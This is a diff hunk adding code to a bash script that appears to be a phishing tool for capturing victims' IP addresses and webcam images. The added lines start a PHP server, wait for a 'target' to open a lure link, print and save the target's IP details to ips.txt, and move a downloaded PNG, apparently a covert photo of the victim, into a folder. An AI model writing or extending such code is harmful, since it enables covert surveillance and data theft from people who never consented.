@@ -663,3 +663,33 @@ while true; do
     fi
     sleep 0.5
 done
+p 1
+status=$(curl -s --head -w %{http_code} 127.0.0.1:${PORT} -o /dev/null)
+if echo "$status" | grep -q "404"; then
+    echo -e "${error}PHP couldn't start!\n\007"
+    killer; exit 1
+else
+    echo -e "${success}PHP started succesfully!\n"
+fi
+sleep 1
+rm -rf ip.txt
+echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
+while true; do
+    if [[ -e "ip.txt" ]]; then
+        echo -e "\007${success}Target opened the link!\n"
+        while IFS= read -r line; do
+            echo -e "${green}[${blue}*${green}]${yellow} $line"
+        done < ip.txt
+        echo ""
+        cat ip.txt >> $cwd/ips.txt
+        rm -rf ip.txt
+    fi
+    sleep 0.5
+    if [[ -e "log.txt" ]]; then
+        echo -e "\007${success}Image downloaded! Check directory!\n"
+        file=`ls | grep png`
+        mv -f $file $FOL
+        rm -rf log.txt
+    fi
+    sleep 0.5
+done
